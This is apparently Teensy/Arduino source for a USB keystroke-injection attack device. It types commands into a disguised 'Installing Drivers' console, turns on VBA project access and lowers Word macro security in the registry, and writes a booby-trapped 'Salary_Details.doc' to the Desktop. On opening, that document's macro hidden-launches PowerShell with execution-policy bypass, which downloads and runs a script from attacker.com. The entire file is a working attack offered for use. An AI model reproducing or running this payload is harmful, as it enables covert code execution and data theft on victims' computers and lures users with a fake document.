#define TEENSY3
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $Wrd = New-Object -ComObject Word.Application > %temp%\\dwd.ps1");
  Keyboard.println("echo $Pld = \"powershell.exe -WindowStyle hidden -ep bypass -nologo -noprofile -c EX ((New-Object Net.WebClient).DownloadString('http://attacker.com/Get-Information.ps1'));Get-Information \" >> %temp%\\dwd.ps1");
  Keyboard.println("echo $OFile = \"$env:Userprofile\\Desktop\\Salary_Details.doc\" >> %temp%\\dwd.ps1");
  Keyboard.println("echo $WrdV = $Wrd.Version >> %temp%\\dwd.ps1");
  Keyboard.println("echo if (($WrdV -eq \"12.0\") -or  ($WrdV -eq \"11.0\")){ >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Wrd.DisplayAlerts = $False} >> %temp%\\dwd.ps1");
  Keyboard.println("echo else {$Wrd.DisplayAlerts = \"wdAlertsNone\"} >> %temp%\\dwd.ps1");
  Keyboard.println("echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$WrdV\\word\\Security\" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dwd.ps1");
  Keyboard.println("echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$WrdV\\word\\Security\" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dwd.ps1");
  Keyboard.println("echo $ce = @^\" >> %temp%\\dwd.ps1");
  Keyboard.println("echo Sub Document_Open() >> %temp%\\dwd.ps1");
  Keyboard.println("echo Execute >> %temp%\\dwd.ps1");
  Keyboard.println("echo End Sub >> %temp%\\dwd.ps1");
  Keyboard.println("echo Public Function Execute() As Variant >> %temp%\\dwd.ps1");
  Keyboard.println("echo Const HIDDEN_WINDOW = 0 >> %temp%\\dwd.ps1");
  Keyboard.println("echo strComputer = \".\" >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objWMIService = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2\") >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\") >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objConfig = objStartup.SpawnInstance_ >> %temp%\\dwd.ps1");
  Keyboard.println("echo objConfig.ShowWindow = HIDDEN_WINDOW >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objProcess = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2:Win32_Process\") >> %temp%\\dwd.ps1");
  Keyboard.println("echo objProcess.Create \"$Pld\", Null, objConfig, intProcessID >> %temp%\\dwd.ps1");
  Keyboard.println("echo End Function >> %temp%\\dwd.ps1");
  Keyboard.println("echo ^\"@ >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc = $Wrd.documents.add() >> %temp%\\dwd.ps1");
  Keyboard.println("echo $DocM = $Doc.VBProject.VBComponents.Item(1) >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc = $Wrd.documents.add() >> %temp%\\dwd.ps1");
  Keyboard.println("echo $DocM = $Doc.VBProject.VBComponents.Item(1) >> %temp%\\dwd.ps1");
  Keyboard.println("echo $DocM.CodeModule.AddFromString($ce) >> %temp%\\dwd.ps1");
  Keyboard.println("echo if (($WrdV -eq \"12.0\") -or  ($WrdV -eq \"11.0\")){ >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc.Saveas($OFile, 0)} >> %temp%\\dwd.ps1");
  Keyboard.println("echo else {$Doc.Saveas([ref]$OFile, [ref]0)} >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc.Close() >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Wrd.quit() >> %temp%\\dwd.ps1");
  Keyboard.println("echo [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Wrd) >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dwd.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dwd.ps1\"),0,true >> %temp%\\dwd.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dwd.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }

